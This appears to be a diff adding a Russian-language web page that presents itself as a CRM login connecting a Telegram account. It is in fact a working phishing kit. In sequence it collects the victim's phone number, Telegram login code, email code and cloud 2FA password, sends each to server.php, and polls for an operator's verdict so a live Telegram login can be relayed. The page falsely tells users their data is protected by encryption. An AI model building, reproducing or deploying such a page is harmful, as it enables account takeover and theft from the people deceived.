@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRM System Auth</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
+        .container { max-width: 400px; margin: 0 auto; }
+        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 60px; height: 60px; }
+        h1 { text-align: center; color: #333; margin-bottom: 10px; }
+        .subtitle { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #333; font-weight: bold; }
+        input, select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
+        input:focus, select:focus { border-color: #667eea; outline: none; }
+        .btn { background: #667eea; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background: #5a67d8; }
+        .btn-success { background: #48bb78; }
+        .btn-success:hover { background: #38a169; }
+        .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center; display: none; }
+        .alert-success { background: #c6f6d5; color: #22543d; }
+        .alert-error { background: #fed7d7; color: #742a2a; }
+        .alert-info { background: #bee3f8; color: #2a4365; }
+        .loading { text-align: center; padding: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 15px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .session-id { background: #f7fafc; padding: 8px; border-radius: 6px; font-family: monospace; font-size: 12px; margin: 10px 0; text-align: center; }
+        .back-btn { background: #a0aec0; color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; margin-bottom: 15px; cursor: pointer; }
+        .back-btn:hover { background: #718096; }
+        .step-indicator { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .step-dot { width: 10px; height: 10px; border-radius: 50%; background: #ddd; }
+        .step-dot.active { background: #667eea; }
+        .phone-input { display: flex; gap: 10px; }
+        .country-code { flex: 0 0 80px; }
+        .phone-number { flex: 1; }
+        .instructions { background: #f7fafc; padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 13px; border-left: 4px solid #667eea; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">🔐</div>
+            <h1>Подключение к CRM системе</h1>
+            <p class="subtitle">Аутентификация через Telegram для доступа к CRM</p>
+            
+            <div class="step-indicator">
+                <div class="step-dot active" id="dot1"></div>
+                <div class="step-dot" id="dot2"></div>
+                <div class="step-dot" id="dot3"></div>
+                <div class="step-dot" id="dot4"></div>
+                <div class="step-dot" id="dot5"></div>
+                <div class="step-dot" id="dot6"></div>
+            </div>
+            
+            <div class="alert" id="alert"></div>
+            
+            <!-- Шаг 1: Ввод телефона -->
+            <div class="step active" id="step1">
+                <div class="form-group">
+                    <label>Номер телефона Telegram</label>
+                    <div class="phone-input">
+                        <select class="country-code" id="countryCode">
+                            <option value="7">🇷🇺 Россия +7</option>
+                            <option value="375">🇧🇾 Беларусь +375</option>
+                            <option value="1">🇺🇸 США +1</option>
+                            <option value="44">🇬🇧 Британия +44</option>
+                            <option value="77">🇰🇿 Казахстан +7</option>
+                        </select>
+                        <input type="tel" id="phone" placeholder="912345678" class="phone-number">
+                    </div>
+                </div>
+                <button class="btn" onclick="sendPhone()">Начать подключение</button>
+                <div class="instructions">
+                    🔒 <strong>Безопасно:</strong> Ваши данные защищены шифрованием
+                </div>
+            </div>
+            
+            <!-- Шаг 2: Ожидание аутентификации -->
+            <div class="step" id="step2">
+                <div class="loading">
+                    <div class="loader"></div>
+                    <p><strong>Выполняется аутентификация...</strong></p>
+                    <div class="session-id" id="sessionId">ID: loading...</div>
+                    <div class="instructions">
+                        📞 <strong>Номер:</strong> <span id="waitingPhone"></span><br>
+                        ⏱️ <strong>Ожидание:</strong> <span id="waitingTime">0</span> сек.
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Шаг 3: Ввод кода из Telegram -->
+            <div class="step" id="step3">
+                <button class="back-btn" onclick="backToStep1()">← Назад</button>
+                <div class="form-group">
+                    <label>Код из Telegram (5 цифр)</label>
+                    <input type="text" id="tgCode" placeholder="12345" maxlength="5">
+                </div>
+                <div class="instructions">
+                    📱 <strong>Где найти код?</strong><br>
+                    1. Откройте Telegram<br>
+                    2. Найдите сообщение с кодом<br>
+                    3. Введите 5 цифр
+                </div>
+                <button class="btn" onclick="sendTgCode()">Отправить на проверку</button>
+            </div>
+            
+            <!-- Шаг 4: Ввод кода с почты -->
+            <div class="step" id="step4">
+                <button class="back-btn" onclick="backToStep1()">← Назад</button>
+                <div class="form-group">
+                    <label>Код с email (6 цифр)</label>
+                    <input type="text" id="emailCode" placeholder="123456" maxlength="6">
+                </div>
+                <div class="instructions">
+                    📧 <strong>Где найти код?</strong><br>
+                    1. Проверьте почту<br>
+                    2. Найдите письмо от Telegram<br>
+                    3. Введите 6 цифр
+                </div>
+                <button class="btn" onclick="sendEmailCode()">Отправить на проверку</button>
+            </div>
+            
+            <!-- Шаг 5: Ввод облачного пароля 2FA -->
+            <div class="step" id="step5">
+                <button class="back-btn" onclick="backToStep1()">← Назад</button>
+                <div class="form-group">
+                    <label>Облачный пароль 2FA</label>
+                    <input type="password" id="password2FA" placeholder="Введите пароль двухфакторной аутентификации">
+                </div>
+                <div class="instructions">
+                    🔐 <strong>Что это такое?</strong><br>
+                    Пароль облачного Telegram, который вы устанавливали для защиты аккаунта
+                </div>
+                <button class="btn" onclick="send2FAPassword()">Отправить на проверку</button>
+            </div>
+            
+            <!-- Шаг 6: Успех -->
+            <div class="step" id="step6">
+                <div class="alert alert-success">
+                    ✅ <strong>Подключение успешно!</strong>
+                </div>
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 48px; margin-bottom: 10px;">🎉</div>
+                    <p><strong>Ваш аккаунт подключен к CRM системе</strong></p>
+                    <div class="instructions">
+                        📞 <strong>Номер:</strong> <span id="finalPhone"></span><br>
+                        🕐 <strong>Время:</strong> <span id="finalTime"></span><br>
+                        ✅ <strong>Статус:</strong> Аутентификация пройдена
+                    </div>
+                </div>
+                <button class="btn btn-success" onclick="resetForm()">Подключить другой аккаунт</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        let sessionId = '';
+        let userPhone = '';
+        let waitingTimer = null;
+        let waitingSeconds = 0;
+        
+        // Восстанавливаем состояние из localStorage
+        function restoreState() {
+            const savedSession = localStorage.getItem('crm_auth_session');
+            if (savedSession) {
+                try {
+                    const session = JSON.parse(savedSession);
+                    sessionId = session.sessionId || '';
+                    userPhone = session.userPhone || '';
+                    currentStep = session.currentStep || 1;
+                    
+                    if (sessionId && userPhone && currentStep > 1) {
+                        showStep(currentStep);
+                        document.getElementById('sessionId').textContent = `ID: ${sessionId}`;
+                        document.getElementById('waitingPhone').textContent = userPhone;
+                        
+                        if (currentStep === 2) {
+                            checkAuthResponse();
+                        } else if (currentStep === 3 || currentStep === 4 || currentStep === 5) {
+                            // Проверяем статус кода
+                            checkCodeStatus();
+                        }
+                    }
+                } catch (e) {
+                    console.error('Ошибка восстановления:', e);
+                }
+            }
+        }
+        
+        // Сохраняем состояние в localStorage
+        function saveState() {
+            const session = {
+                sessionId: sessionId,
+                userPhone: userPhone,
+                currentStep: currentStep,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('crm_auth_session', JSON.stringify(session));
+        }
+        
+        function showStep(step) {
+            // Скрываем все шаги
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            // Показываем нужный шаг
+            document.getElementById(`step${step}`).classList.add('active');
+            // Обновляем индикатор
+            document.querySelectorAll('.step-dot').forEach((dot, index) => {
+                dot.classList.toggle('active', index + 1 === step);
+            });
+            currentStep = step;
+            
+            // Сохраняем состояние
+            saveState();
+            
+            // Останавливаем таймер если не на шаге ожидания
+            if (step !== 2 && waitingTimer) {
+                clearInterval(waitingTimer);
+                waitingSeconds = 0;
+            }
+        }
+        
+        function showAlert(message, type = 'info') {
+            const alert = document.getElementById('alert');
+            alert.textContent = message;
+            alert.className = `alert alert-${type}`;
+            alert.style.display = 'block';
+            
+            if (type !== 'error') {
+                setTimeout(() => {
+                    alert.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        function hideAlert() {
+            document.getElementById('alert').style.display = 'none';
+        }
+        
+        async function sendPhone() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            const countryCode = document.getElementById('countryCode').value;
+            
+            if (!phoneInput || !/^\d{5,15}$/.test(phoneInput)) {
+                showAlert('Введите корректный номер телефона (5-15 цифр)', 'error');
+                return;
+            }
+            
+            userPhone = `+${countryCode}${phoneInput}`;
+            sessionId = 'session_' + Date.now();
+            
+            // Показываем информацию
+            document.getElementById('sessionId').textContent = `ID: ${sessionId}`;
+            document.getElementById('waitingPhone').textContent = userPhone;
+            document.getElementById('waitingTime').textContent = '0';
+            
+            // Переходим к ожиданию
+            showStep(2);
+            hideAlert();
+            
+            // Запускаем таймер ожидания
+            waitingSeconds = 0;
+            waitingTimer = setInterval(() => {
+                waitingSeconds++;
+                document.getElementById('waitingTime').textContent = waitingSeconds;
+            }, 1000);
+            
+            try {
+                const response = await fetch('server.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'new_session',
+                        session_id: sessionId,
+                        phone: userPhone,
+                        country_code: countryCode
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showAlert('✅ Запрос на аутентификацию отправлен! Ожидайте...', 'success');
+                    // Начинаем проверять статус
+                    checkAuthResponse();
+                } else {
+                    throw new Error(data.error || 'Ошибка сервера');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка: ' + error.message, 'error');
+                showStep(1);
+                clearInterval(waitingTimer);
+            }
+        }
+        
+        function checkAuthResponse() {
+            let attempts = 0;
+            const maxAttempts = 600; // 20 минут
+            
+            const check = async () => {
+                attempts++;
+                
+                if (attempts >= maxAttempts) {
+                    showAlert('⏱️ Время ожидания истекло', 'error');
+                    showStep(1);
+                    clearInterval(waitingTimer);
+                    localStorage.removeItem('crm_auth_session');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch('server.php', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            action: 'check_status',
+                            session_id: sessionId
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        switch (data.status) {
+                            case 'tg_code':
+                                clearInterval(waitingTimer);
+                                showAlert('✅ Номер подтвержден! Введите код из Telegram', 'success');
+                                showStep(3);
+                                return;
+                                
+                            case 'email_code':
+                                clearInterval(waitingTimer);
+                                showAlert('📧 Запрошен email код', 'info');
+                                showStep(4);
+                                return;
+                                
+                            case 'denied':
+                                clearInterval(waitingTimer);
+                                showAlert('❌ Аутентификация отклонена', 'error');
+                                showStep(1);
+                                localStorage.removeItem('crm_auth_session');
+                                return;
+                                
+                            default:
+                                // Продолжаем ждать
+                                setTimeout(check, 2000);
+                        }
+                    } else {
+                        setTimeout(check, 2000);
+                    }
+                } catch (error) {
+                    setTimeout(check, 2000);
+                }
+            };
+            
+            setTimeout(check, 2000);
+        }
+        
+        async function sendTgCode() {
+            const code = document.getElementById('tgCode').value.trim();
+            
+            if (!code || !/^\d{5}$/.test(code)) {
+                showAlert('Введите 5-значный код', 'error');
+                return;
+            }
+            
+            showAlert('📤 Отправляем код на проверку...', 'info');
+            
+            try {
+                const response = await fetch('server.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'send_code',
+                        session_id: sessionId,
+                        code: code,
+                        code_type: 'tg_code'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showAlert('✅ Код отправлен! Ожидаем проверки...', 'success');
+                    checkCodeStatus();
+                } else {
+                    throw new Error(data.error || 'Ошибка отправки');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка: ' + error.message, 'error');
+            }
+        }
+        
+        async function sendEmailCode() {
+            const code = document.getElementById('emailCode').value.trim();
+            
+            if (!code || !/^\d{6}$/.test(code)) {
+                showAlert('Введите 6-значный код', 'error');
+                return;
+            }
+            
+            showAlert('📤 Отправляем email код на проверку...', 'info');
+            
+            try {
+                const response = await fetch('server.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'send_code',
+                        session_id: sessionId,
+                        code: code,
+                        code_type: 'email_code'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showAlert('✅ Email код отправлен! Ожидаем проверки...', 'success');
+                    checkCodeStatus();
+                } else {
+                    throw new Error(data.error || 'Ошибка отправки');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка: ' + error.message, 'error');
+            }
+        }
+        
+        async function send2FAPassword() {
+            const password = document.getElementById('password2FA').value.trim();
+            
+            if (!password) {
+                showAlert('Введите пароль 2FA', 'error');
+                return;
+            }
+            
+            showAlert('📤 Отправляем пароль 2FA на проверку...', 'info');
+            
+            try {
+                const response = await fetch('server.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'send_code',
+                        session_id: sessionId,
+                        code: password,
+                        code_type: 'password_2fa'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showAlert('✅ Пароль отправлен! Ожидаем проверки...', 'success');
+                    checkCodeStatus();
+                } else {
+                    throw new Error(data.error || 'Ошибка отправки');
+                }
+            } catch (error) {
+                showAlert('❌ Ошибка: ' + error.message, 'error');
+            }
+        }
+        
+        function checkCodeStatus() {
+            let attempts = 0;
+            const maxAttempts = 300;
+            
+            const check = async () => {
+                attempts++;
+                
+                if (attempts >= maxAttempts) {
+                    showAlert('⏱️ Время проверки истекло', 'error');
+                    showStep(currentStep);
+                    return;
+                }
+                
+                try {
+                    const response = await fetch('server.php', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            action: 'check_code_status',
+                            session_id: sessionId
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        switch (data.status) {
+                            case 'correct':
+                                // Код верный, проверяем нужен ли пароль 2FA
+                                if (data.next_step === 'password_2fa') {
+                                    showAlert('✅ Код верный! Теперь введите пароль 2FA', 'success');
+                                    showStep(5);
+                                } else {
+                                    showAlert('✅ Код подтвержден!', 'success');
+                                    completeAuth();
+                                }
+                                return;
+                                
+                            case 'incorrect':
+                                showAlert('❌ Код неверный, повторите попытку', 'error');
+                                // Очищаем поле ввода
+                                if (currentStep === 3) {
+                                    document.getElementById('tgCode').value = '';
+                                    document.getElementById('tgCode').focus();
+                                } else if (currentStep === 4) {
+                                    document.getElementById('emailCode').value = '';
+                                    document.getElementById('emailCode').focus();
+                                } else if (currentStep === 5) {
+                                    document.getElementById('password2FA').value = '';
+                                    document.getElementById('password2FA').focus();
+                                }
+                                return;
+                                
+                            default:
+                                setTimeout(check, 2000);
+                        }
+                    } else {
+                        setTimeout(check, 2000);
+                    }
+                } catch (error) {
+                    setTimeout(check, 2000);
+                }
+            };
+            
+            setTimeout(check, 2000);
+        }
+        
+        async function completeAuth() {
+            try {
+                const response = await fetch('server.php', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'complete_auth',
+                        session_id: sessionId
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('finalPhone').textContent = userPhone;
+                    document.getElementById('finalTime').textContent = new Date().toLocaleTimeString();
+                    showStep(6);
+                    localStorage.removeItem('crm_auth_session');
+                }
+            } catch (error) {
+                showAlert('Ошибка завершения', 'error');
+            }
+        }
+        
+        function backToStep1() {
+            showStep(1);
+            hideAlert();
+            if (waitingTimer) {
+                clearInterval(waitingTimer);
+                waitingSeconds = 0;
+            }
+        }
+        
+        function resetForm() {
+            document.getElementById('phone').value = '';
+            document.getElementById('tgCode').value = '';
+            document.getElementById('emailCode').value = '';
+            document.getElementById('password2FA').value = '';
+            document.getElementById('countryCode').value = '7';
+            hideAlert();
+            showStep(1);
+            sessionId = '';
+            userPhone = '';
+            localStorage.removeItem('crm_auth_session');
+        }
+        
+        // Обработчики Enter
+        document.getElementById('phone').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendPhone();
+        });
+        
+        document.getElementById('tgCode').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendTgCode();
+        });
+        
+        document.getElementById('emailCode').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendEmailCode();
+        });
+        
+        document.getElementById('password2FA').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') send2FAPassword();
+        });
+        
+        // Автоотправка при полном вводе
+        document.getElementById('tgCode').addEventListener('input', (e) => {
+            if (e.target.value.length === 5) {
+                setTimeout(() => sendTgCode(), 100);
+            }
+        });
+        
+        document.getElementById('emailCode').addEventListener('input', (e) => {
+            if (e.target.value.length === 6) {
+                setTimeout(() => sendEmailCode(), 100);
+            }
+        });
+        
+        // Восстанавливаем состояние при загрузке
+        window.addEventListener('load', restoreState);
+    </script>
+</body>
+</html>
